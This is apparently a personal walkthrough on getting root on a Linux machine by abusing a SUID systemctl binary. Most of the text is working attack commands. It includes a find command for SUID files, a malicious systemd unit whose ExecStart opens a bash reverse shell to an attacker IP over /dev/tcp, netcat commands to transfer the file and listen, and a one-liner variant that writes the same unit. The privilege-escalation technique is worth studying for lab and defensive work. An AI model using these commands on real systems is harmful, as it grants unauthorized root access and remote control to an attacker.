
Once we get user on the linux system we can check for a privesc using systemctl

First we can run 

Find / -user root -perm -4000 -exec ls -ldb {} \;

Which shows us all SUID files where we can check for insteresting files like /bin/systemctl that 
allows us to run commands as root. We can use this later

First we need to find writable directories like this:

find / -type d -maxdepth 2 -writable

cd into a writeable dir such as /var/temp

Then we can write our file that will spawn us a root shell, this will look like:

filename will be root.service

[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.9.2.27/9999 0>&1'

[Install]
WantedBy=multi-user.target



Now we need to transfer the file from our machine via netcat or whatever option is available, 
we can do this using the commands: 

nc -l -p 1234 > output.file # run this on target machine

nc -w 3 [our machine ip] 1234 < output.file # run this on our machine


Start the listener on our machine:

nc -lvnp 9999  

now that we have our file we need to enable the service via:

/bin/systemctl enable /var/tmp/root.service

output should show something like "created symlink /etc "

finally we can start the listener on our machine, and then execute our file using: 

/bin/systemctl start root

and just like that we should get a root shell connected back to our machine



# without file transfer 


Another way we can try to do this is similar but without having to transfer files

First we need to check for writeable directories again

find / -type d -maxdepth 2 -writable

cd into the directory and run the following one liner command

RATME="'bash -i >& /dev/tcp/yourIPHere/9999 0>&1'" echo '[Unit]\nDescription=rooted-Oneliner\n\n[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c '$RATME'\n\n[Install]\nWantedBy=multi-user.target' >root.service

Dont forget to start the nc listener on our machine:

nc -lvnp 9999  

to start it we again use:

/bin/systemctl enable /whatever-writable-dir/root.service

and 

/bin/systemctl start root


This should give us a root shell connected back to our machine 